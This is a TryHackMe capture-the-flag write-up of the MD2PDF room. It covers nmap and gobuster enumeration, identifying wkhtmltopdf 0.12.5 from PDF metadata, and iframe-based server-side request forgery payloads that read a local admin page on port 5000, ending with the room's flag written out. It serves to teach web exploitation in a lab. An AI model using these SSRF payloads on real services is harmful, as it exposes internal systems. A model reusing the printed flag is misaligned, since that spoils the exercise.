### MD2PDF TryHackMe

### Difficulty = Easy

###  Description: Hello Hacker! TopTierConversions LTD is proud to announce its latest and greatest product launch: MD2PDF. This easy-to-use utility converts markdown files to PDF and is totally secure! Right...?

Nmap Scan:

```
└─$ nmap -sCV 10.10.174.101 -p22,80,5000 -Pn
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-11 01:23 WAT
Nmap scan report for 10.10.174.101
Host is up.

PORT     STATE    SERVICE VERSION
22/tcp   filtered ssh
80/tcp   filtered http
5000/tcp filtered upnp

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 3.75 seconds

```

Checking the web server on port 80 shows that it converts markdown file to pdf
![image](https://user-images.githubusercontent.com/113513376/218225529-7bc01174-6686-4a9b-a582-8469db003229.png)

So if i include things markdown uses it will be converted to pdf
![image](https://user-images.githubusercontent.com/113513376/218225870-99385672-ac3f-4d49-84f3-165b8ef1a73f.png)

Now i'll download the generated pdf file to check out the metadata

```
┌──(mark㉿haxor)-[~/Desktop]
└─$ file document.pdf                       
document.pdf: PDF document, version 1.4, 0 pages
                                                                                                        
┌──(mark㉿haxor)-[~/Desktop]
└─$ exiftool document.pdf
ExifTool Version Number         : 12.44
File Name                       : document.pdf
Directory                       : .
File Size                       : 13 kB
File Modification Date/Time     : 2023:02:11 01:25:32+01:00
File Access Date/Time           : 2023:02:11 01:25:33+01:00
File Inode Change Date/Time     : 2023:02:11 01:25:32+01:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Title                           : 
Creator                         : wkhtmltopdf 0.12.5
Producer                        : Qt 4.8.7
Create Date                     : 2023:02:11 00:19:54Z
Page Count                      : 1
Page Mode                       : UseOutlines
```

Ok so we see the creator name `wkhtmltopdf 0.12.5` I'll search google to know if there's publicly known exploit it
![image](https://user-images.githubusercontent.com/113513376/218226141-d361cfa9-bc45-442a-92c7-d03f316d72d1.png)
![image](https://user-images.githubusercontent.com/113513376/218226171-ea30edb1-b3d9-42a5-aea6-5ea24d8c4e67.png)

Reading about the [exploit](https://cyber-guy.gitbook.io/cyber-guys-blog/blogs/initial-access-via-pdf-file-silently) shows that we can use iframe tag and perform Server Side Request Forgery

```
Payload: <iframe src="http://localhost/" width="1000" height="2000">`
```

But using that payload is not what we want cause we need the flag not the web page of the web server running on port 80

Now i'll run gobuster to see if there's any interesting thing

```
└─$ gobuster dir -u http://10.10.174.101/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.174.101/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2023/02/11 01:05:06 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 403) [Size: 166]
Progress: 4612 / 4615 (100.00%)
===============================================================
2023/02/11 01:07:12 Finished
===============================================================
```

There's an admin directory which when accessed gives 403
![image](https://user-images.githubusercontent.com/113513376/218227204-d6591ee0-3b2d-4688-abe3-5e21432bd0dd.png)

Cool so now what we can do is to leverage the SSRF vulnerability and view the admin directory on port 5000
![image](https://user-images.githubusercontent.com/113513376/218227301-9bc2b6b5-1615-4153-a05b-d7ec3e220c81.png)

```
Payload: <iframe src="http://localhost:5000/admin" width="1000" height="2000">`
```

On submitting the payload we get the flag xD
![image](https://user-images.githubusercontent.com/113513376/218227325-9ea44126-4fc5-493b-88e7-914836fb58f9.png)

```
Flag: flag{1f4a2b6ffeaf4707c43885d704eaee4b}
```

And we're done 

<br> <br>
[Back To Home](../../index.md)
